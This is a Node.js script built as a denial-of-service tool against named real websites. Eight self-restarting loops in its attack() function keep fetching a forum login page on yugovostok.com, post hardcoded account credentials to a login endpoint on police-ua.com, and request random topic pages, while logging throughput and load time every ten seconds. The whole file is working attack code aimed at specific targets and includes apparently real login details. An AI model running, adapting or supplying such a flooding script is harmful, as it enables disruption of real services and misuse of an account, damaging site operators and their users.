const request = require('request');
const qs = require('querystring');
const _ = require('underscore');

var requestsCount = 0;
var loadTimeSum = 0;

function parseCookies(cookieHeaders, cookies = {}) {
  if (cookieHeaders instanceof Array) {
    cookieHeaders.forEach(function (cookie) {
      cookie = /^([^=]+)=([^;]+)/.exec(cookie);
      if (cookie) {
        cookies[cookie[1]] = cookie[2];
      }
    });
  }
}

function attack() {
  const start = Date.now();
  function finish() {
    requestsCount++;
    loadTimeSum += Date.now() - start;
    attack();
  }
  const referer = 'http://yugovostok.com/ucp.php?mode=login';
  request(referer, function (err, res, data) {
    if (err) {
      console.error(err);
    }
    else {
      if (200 !== res.statusCode) {
        console.error(res.statusCode);
        return finish();
      }
      const r = /name="([^"]+)[^>]+value="([^"]+)"/g;
      const form = {};
      let m;
      while (m = r.exec(data)) {
        form[m[1]] = m[2]
      }
      form.vb_login_username = 'House';
      form.vb_login_password_hint = 'palka2000';
      const cookies = {};
      parseCookies(res.headers['set-cookie'], cookies);
      request.post('http://police-ua.com/login.php?do=login', {
        form: form,
        headers: {cookie: qs.encode(cookies, '; ')}
      }, function (err, res, data) {
        if (err || 302 !== res.statusCode) {
          console.error(err || res.statusCode);
          return finish();
        }
        parseCookies(res.headers['set-cookie'], cookies);
        const options = {headers: {cookie: qs.encode(cookies, '; ')}};
        request('http://yugovostok.com/viewtopic.php?t=' + _.random(1, 200), options, function (err, res, data) {
          if (err || (200 !== res.statusCode && 404 !== res.statusCode)) {
            console.error(err || res.statusCode);
          }
          finish();
        });
      })
    }
  })
}

setInterval(function () {
  const time = new Date().toLocaleString();
  const loading = Math.round(loadTimeSum / requestsCount);
  console.log(`# ${time} # ${loading} # ${requestsCount}`);
  loadTimeSum = 0;
  requestsCount = 0;
}, 10000);

for (let i = 0; i < 8; i++) {
  setTimeout(attack, _.random(1, i * 20))
}
